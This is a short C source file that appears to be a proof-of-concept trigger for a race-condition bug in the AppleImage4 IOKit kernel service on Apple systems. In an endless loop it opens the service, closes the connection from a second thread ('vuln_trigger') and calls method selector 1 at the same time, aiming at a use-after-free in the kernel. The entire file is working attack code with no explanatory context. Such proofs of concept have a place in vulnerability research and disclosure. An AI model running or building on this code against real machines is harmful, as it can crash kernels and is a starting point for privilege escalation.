#include <Foundation/Foundation.h>
#include <IOKit/IOKitLib.h>
#include <pthread.h>

int trigger = 0;

struct IOExternalMethodDispatch {
    void* function;
    uint32_t checkScalarInputCount;
    uint32_t checkStructureInputSize;
    uint32_t checkScalarOutputCount;
    uint32_t checkStructureOutputSize;
};

void* vuln_trigger(void* arg) {
    io_object_t conn = (io_object_t)arg;
    trigger = 1;

    IOServiceClose(conn);
    return 0;
}

int main() {
    // turn off stdout buffering
    setbuf(stdout, NULL);

    while (1) {
        kern_return_t kr;

        io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleImage4"));
        if (service == IO_OBJECT_NULL) {
            printf("[-] Failed to find service\n");
            exit(0);
        }

        io_connect_t conn;
        kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
        if (kr != KERN_SUCCESS) {
            printf("[-] Failed to open service: %x\n", kr);
            exit(0);
        }
        printf("[+] Opened service=0x%x\n", conn);
        
		uint64_t inputScalar[16] = {0};
        uint64_t inputScalarCnt = 1;

        char inputStruct[4096] = {0};
        size_t inputStructCnt = 0;

        uint64_t outputScalar[16] = {0};
        uint32_t outputScalarCnt = 9;

        char outputStruct[4096] = {0};
        size_t outputStructCnt = 0;

        uint32_t selector = 1;
        pthread_t thread;
        pthread_create(&thread, NULL, vuln_trigger, (void*)conn);
        while (!trigger);

        kr = IOConnectCallMethod(
            conn,
            selector,
            inputScalar,
            inputScalarCnt,
            inputStruct,
            inputStructCnt,
            outputScalar,
            &outputScalarCnt,
            outputStruct,
            &outputStructCnt);
        trigger = 0;
    }

    return 0;
}
